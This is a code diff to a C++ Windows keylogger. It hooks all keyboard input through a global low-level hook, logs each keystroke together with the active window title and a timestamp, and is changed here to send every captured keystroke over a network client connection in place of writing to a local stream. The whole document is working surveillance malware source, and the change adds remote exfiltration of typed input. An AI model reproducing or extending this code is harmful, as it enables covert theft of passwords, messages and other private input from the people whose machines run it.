@@ -3,12 +3,14 @@
 
 #include "runtime/utils.h"
 #include "keylog.h"
+#include "connection/client.h"
 
 HHOOK _hook;
 
 KBDLLHOOKSTRUCT kbdStruct;
 
-static std::ostream * outStream;
+// static std::ostream * outStream;
+client* cli;
 
 static LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 {
@@ -18,14 +20,14 @@ static LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 		if (wParam == WM_KEYDOWN)
 		{
 			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
-			LogKeyStoke(outStream ,kbdStruct.vkCode);
+			LogKeyStoke(cli ,kbdStruct.vkCode);
 		}
 	}
 
 	return CallNextHookEx(_hook, nCode, wParam, lParam);
 }
 
-static void KeyLoggerInit(std::ostream* os)
+static void KeyLoggerInit(client * cli)
 {
 	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
 	{
@@ -34,16 +36,16 @@ static void KeyLoggerInit(std::ostream* os)
 
 	// outStream.open("KeyLog.txt", std::ios_base::app);
 	//outStream = new std::ostream(std::cout.rdbuf());
-	outStream = os;
+	::cli = cli;
 }
 
 static void KeyLoggerFini()
 {
 	UnhookWindowsHookEx(_hook);
-	outStream = NULL;
+	// outStream = NULL;
 }
 
-void LogKeyStoke(std::ostream* out, DWORD key_stroke)
+void LogKeyStoke(client* cli, DWORD key_stroke)
 {
 	//std::cout << key_stroke << '\n';
 
@@ -60,7 +62,7 @@ void LogKeyStoke(std::ostream* out, DWORD key_stroke)
 		threadID = GetWindowThreadProcessId(foreground, NULL);
 		layout = GetKeyboardLayout(threadID);
 	}
-
+	string result;
 	if (foreground)
 	{
 		char window_title[256];
@@ -75,42 +77,42 @@ void LogKeyStoke(std::ostream* out, DWORD key_stroke)
 			char s[64];
 			strftime(s, sizeof(s), "%c", tm);
 
-			*out << "\n\n[当前窗口: " << window_title << " - at " << s << "] \n";
+			result = "\n\n[当前窗口: " + string(window_title) + " - at " + s + "] \n";
 		}
 	}
 
 	if (key_stroke == VK_BACK)
-		*out << "[BACKSPACE]";
+		result += "[BACKSPACE]";
 	else if (key_stroke == VK_RETURN)
-		*out << "\n";
+		result += "\n";
 	else if (key_stroke == VK_SPACE)
-		*out << " ";
+		result += " ";
 	else if (key_stroke == VK_TAB)
-		*out << "[TAB]";
+		result += "[TAB]";
 	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
-		*out << "[SHIFT]";
+		result += "[SHIFT]";
 	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
-		*out << "[CONTROL]";
+		result += "[CONTROL]";
 	else if (key_stroke == VK_ESCAPE)
-		*out << "[ESCAPE]";
+		result += "[ESCAPE]";
 	else if (key_stroke == VK_END)
-		*out << "[END]";
+		result += "[END]";
 	else if (key_stroke == VK_HOME)
-		*out << "[HOME]";
+		result += "[HOME]";
 	else if (key_stroke == VK_LEFT)
-		*out << "[LEFT]";
+		result += "[LEFT]";
 	else if (key_stroke == VK_UP)
-		*out << "[UP]";
+		result += "[UP]";
 	else if (key_stroke == VK_RIGHT)
-		*out << "[RIGHT]";
+		result += "[RIGHT]";
 	else if (key_stroke == VK_DOWN)
-		*out << "[DOWN]";
+		result += "[DOWN]";
 	else if (key_stroke == 190 || key_stroke == 110)
-		*out << ".";
+		result += ".";
 	else if (key_stroke == 189 || key_stroke == 109)
-		*out << "-";
+		result += "-";
 	else if (key_stroke == 20)
-		*out << "[CAPSLOCK]";
+		result += "[CAPSLOCK]";
 	else {
 		char key;
 		// check caps lock
@@ -126,11 +128,12 @@ void LogKeyStoke(std::ostream* out, DWORD key_stroke)
 
 		//tolower converts it to lowercase properly
 		if (!lowercase) key = tolower(key);
-		*out << char(key);
+		result += char(key);
+		// *out << char(key);
 	}
-
+	cli->sendRaw(result);
 	//instead of opening and closing file handlers every time, keep file open and flush.
-	(*out).flush();
+	// (*out).flush();
 	return;
 }
 
